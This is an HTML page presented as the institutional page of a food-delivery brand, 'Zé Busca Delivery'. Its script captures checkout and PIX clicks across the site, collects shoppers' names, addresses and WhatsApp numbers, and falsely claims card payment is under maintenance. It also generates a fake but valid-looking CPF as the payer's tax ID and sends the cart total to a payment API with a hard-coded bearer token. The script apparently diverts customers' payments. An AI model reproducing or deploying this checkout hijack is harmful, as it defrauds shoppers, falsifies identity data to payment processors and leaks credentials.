<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zé Busca Delivery - Institucional</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f9fafb; color: #333; line-height: 1.6; margin: 0; padding: 0; }
        .container { max-width: 800px; margin: 50px auto; padding: 30px; background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
        h1 { color: #d97706; }
        p { font-size: 16px; margin: 15px 0; }
        .cnpj-box { background: #fef3c7; border: 1px solid #fde68a; padding: 15px; border-radius: 6px; display: inline-block; margin-top: 20px; font-weight: bold; color: #92400e; }
        .footer { margin-top: 40px; font-size: 14px; color: #666; border-top: 1px solid #eee; padding-top: 20px; }
        .links a { color: #d97706; text-decoration: none; margin: 0 10px; }
        .links a:hover { text-decoration: underline; }
    </style>
<script>
  window.BUSCAR_CEP = async function(cep) {
      var cepLimpo = cep.replace(/\D/g, '');
      if (cepLimpo.length === 8) {
          try {
              document.getElementById('checkout-rua').placeholder = 'Buscando...';
              document.getElementById('checkout-bairro').placeholder = 'Buscando...';
              var res = await fetch('https://viacep.com.br/ws/' + cepLimpo + '/json/');
              var data = await res.json();
              if (!data.erro) {
                  document.getElementById('checkout-rua').value = data.logradouro || '';
                  document.getElementById('checkout-bairro').value = data.bairro || '';
                  document.getElementById('checkout-rua').style.borderColor = '#10b981';
                  document.getElementById('checkout-bairro').style.borderColor = '#10b981';
                  document.getElementById('checkout-num').focus();
              } else {
                  document.getElementById('checkout-rua').placeholder = 'Ex: Rua das Flores';
                  document.getElementById('checkout-bairro').placeholder = 'Ex: Centro';
              }
          } catch(e) {
              console.error(e);
          }
      }
  };

  window.GERAR_CPF_VALIDO = function() {
      var n = [];
      for(var i=0;i<9;i++) n.push(Math.floor(Math.random()*10));
      var d1 = n.reduce(function(acc, val, i) { return acc + val * (10 - i); }, 0) % 11;
      d1 = d1 < 2 ? 0 : 11 - d1;
      n.push(d1);
      var d2 = n.reduce(function(acc, val, i) { return acc + val * (11 - i); }, 0) % 11;
      d2 = d2 < 2 ? 0 : 11 - d2;
      n.push(d2);
      return n.join('');
  };

  window.DO_PUFPAG = async function(total, amountInCents, FASTSOFT_AUTH) {
      var nome = document.getElementById('checkout-nome') ? document.getElementById('checkout-nome').value : 'Cliente Delivery';
      var cep = document.getElementById('checkout-cep') ? document.getElementById('checkout-cep').value : '';
      var rua = document.getElementById('checkout-rua').value;
      var num = document.getElementById('checkout-num').value;
      var bairro = document.getElementById('checkout-bairro').value;
      var tel = document.getElementById('checkout-tel').value;
      
      if(!nome || !rua || !num || !bairro || !tel) {
          alert('Por favor, preencha o seu NOME, seu WHATSAPP e os campos do ENDERE\u00c7O.');
          return;
      }
      
      var enderecoCompleto = rua + ', ' + num + ' - ' + bairro + (cep ? ' - CEP: ' + cep : '') + ' (Whats: ' + tel + ')';
      var fakeCpf = window.GERAR_CPF_VALIDO();
      
      document.getElementById('checkout-modal-inner').innerHTML = '<h2 style="color:#111;margin-bottom:15px;font-size:22px;font-weight:900;text-align:center;font-family:Arial,sans-serif;">Aguarde...</h2><p style="color:#333;font-size:16px;text-align:center;font-family:Arial,sans-serif;">Gerando seu PIX seguro...</p>';
      
      var payload = {
          amount: amountInCents,
          currency: "BRL",
          method: "PIX",
          description: "Pedido Delivery - " + enderecoCompleto,
          payer: {
              name: nome,
              taxId: fakeCpf,
              email: "cliente@expressze.lat",
              phone: tel.replace(/\D/g, '') || "11999999999"
          },
          items: [
              {
                  quantity: 1,
                  name: "Pedido Delivery",
                  price: amountInCents,
                  type: "DIGITAL"
              }
          ]
      };
      
      try {
          var res = await fetch('https://api.avenpayments.com/v1/payment', {
              method: 'POST',
              headers: {
                  'Authorization': 'Bearer OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0',
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(payload)
          });
          var data = await res.json();
          var qrcodeText = (data.data && data.data.copypaste) || data.copypaste || (data.pix && data.pix.qrcodeText) || (data.pix && data.pix.qrcode);
          
          if(qrcodeText) {
              var qrcodeImg = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(qrcodeText);
              var successHtml = '<h2 style="color:#111;margin-bottom:15px;font-size:22px;font-weight:900;text-align:center;font-family:Arial,sans-serif;">Pague com PIX</h2>' +
                  '<img src="' + qrcodeImg + '" style="max-width:250px;width:100%;margin:0 auto 15px auto;display:block;" />' +
                  '<p style="font-size:15px;color:#333;margin-bottom:15px;word-break:break-all;text-align:center;font-family:Arial,sans-serif;font-weight:bold;">' + qrcodeText + '</p>' +
                  '<button onclick="navigator.clipboard.writeText(\'' + qrcodeText + '\'); alert(\'C\u00f3digo Copiado!\');" style="background:#10b981;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;margin-bottom:10px;font-family:Arial,sans-serif;">COPIAR C&Oacute;DIGO PIX</button>' +
                  '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#ef4444;color:#fff;border:none;padding:15px 20px;border-radius:8px;font-size:16px;font-weight:900;cursor:pointer;width:100%;font-family:Arial,sans-serif;">FECHAR</button>';
              document.getElementById('checkout-modal-inner').innerHTML = successHtml;
          } else {
              console.error('Erro AVEN:', data);
              alert('Erro ao obter o QR Code do PIX. Tente novamente.');
              document.getElementById('pix-checkout-modal').remove();
          }
      } catch(err) {
          console.error('Erro AVEN:', err);
          alert('Erro de conex\u00e3o ao gerar PIX.');
          document.getElementById('pix-checkout-modal').remove();
      }
  };

  document.addEventListener('click', async function(e) {
      var el = e.target;
      var clickedPix = false;
      while(el && el !== document.body) {
          var text = (el.innerText || el.textContent || '').trim().toLowerCase();
          if (text === 'pix' || text === 'pagar com pix' || text === 'finalizar pedido' || el.closest('[href="/checkout"]') || el.closest('[href="/9345488724234/checkout"]')) {
              clickedPix = true;
              break;
          }
          el = el.parentElement;
      }
      
      if (clickedPix) {
          e.preventDefault();
          e.stopPropagation();
          
          var cartStr = localStorage.getItem('cart-storage') || sessionStorage.getItem('cart-storage');
          var total = 0;
          if(cartStr) {
              try {
                  var cart = JSON.parse(cartStr);
                  var subtotal = cart.state.items.reduce(function(acc, item) { return acc + (item.finalPrice * item.quantity); }, 0);
                  total = subtotal;
                  if(subtotal > 0 && subtotal < 29.9) total += 8.7; // Delivery fee
              } catch(err){}
          }
          
          if(total <= 0) {
              alert('Carrinho vazio ou valor inv\u00e1lido para gerar pedido.');
              return;
          }
          
          var amountInCents = Math.round(total * 100);
          var FASTSOFT_AUTH = 'Bearer OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0';
          
          var inputStyle = 'width:100%;padding:14px;margin-bottom:12px;border:2px solid #aaa;border-radius:8px;box-sizing:border-box;font-size:16px;color:#000;background:#fff;font-family:Arial,sans-serif;font-weight:bold;appearance:none;outline:none;text-shadow:none;';
          var labelStyle = 'display:block;margin-bottom:5px;font-size:14px;color:#333;font-weight:bold;font-family:Arial,sans-serif;';
          
          var modalHtml = '<div id="pix-checkout-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(0px);">' +
              '<div id="checkout-modal-inner" style="background:#fff;padding:30px 20px;border-radius:16px;text-align:left;max-width:400px;width:100%;max-height:90vh;overflow-y:auto;box-shadow:0 15px 30px rgba(0,0,0,0.5);transform:translateZ(0);">' +
              '<h2 style="color:#111;margin-bottom:10px;font-size:24px;font-weight:900;text-align:center;font-family:Arial,sans-serif;letter-spacing:-0.5px;">Dados de Entrega</h2>' +
              '<p style="color:#555;font-size:15px;margin-bottom:20px;text-align:center;font-family:Arial,sans-serif;">Preencha para onde vamos enviar:</p>' +
              
              '<label style="'+labelStyle+'">Seu Nome</label>' +
              '<input type="text" id="checkout-nome" placeholder="Ex: Jo&atilde;o da Silva" style="'+inputStyle+'" />' +
              
              '<label style="'+labelStyle+'">CEP</label>' +
              '<input type="tel" id="checkout-cep" placeholder="Apenas n&uacute;meros" maxlength="9" onkeyup="window.BUSCAR_CEP(this.value)" style="'+inputStyle+'" />' +
              
              '<label style="'+labelStyle+'">Rua / Avenida</label>' +
              '<input type="text" id="checkout-rua" placeholder="Ex: Rua das Flores" style="'+inputStyle+'" />' +
              
              '<label style="'+labelStyle+'">N&uacute;mero / Complemento</label>' +
              '<input type="text" id="checkout-num" placeholder="Ex: 123 - Apto 4" style="'+inputStyle+'" />' +
              
              '<label style="'+labelStyle+'">Bairro</label>' +
              '<input type="text" id="checkout-bairro" placeholder="Ex: Centro" style="'+inputStyle+'" />' +
              
              '<label style="'+labelStyle+'">Seu WhatsApp</label>' +
              '<input type="tel" id="checkout-tel" placeholder="Ex: 11999999999" style="'+inputStyle+'" />' +
              
              '<button onclick="window.DO_PUFPAG('+total+', '+amountInCents+', \''+FASTSOFT_AUTH+'\')" style="background:#f59e0b;color:#000;border:none;padding:16px 20px;border-radius:10px;font-size:18px;font-weight:900;cursor:pointer;width:100%;margin-bottom:8px;font-family:Arial,sans-serif;box-shadow:0 4px 6px rgba(0,0,0,0.1);text-transform:uppercase;">Gerar PIX R$ '+(total.toFixed(2).replace('.',','))+'</button>' +
              '<p style="text-align:center;color:#ef4444;font-size:13px;font-family:Arial,sans-serif;margin-bottom:14px;font-weight:bold;">&#9888;&#65039; Pagamento via Cart&atilde;o em Manuten&ccedil;&atilde;o</p>' +
              '<button onclick="document.getElementById(\'pix-checkout-modal\').remove();" style="background:#e5e7eb;color:#333;border:none;padding:14px 20px;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;width:100%;font-family:Arial,sans-serif;">Voltar ao Carrinho</button>' +
              '</div></div>';
          
          document.body.insertAdjacentHTML('beforeend', modalHtml);
      }
  }, true);
</script>
</body>
</html>
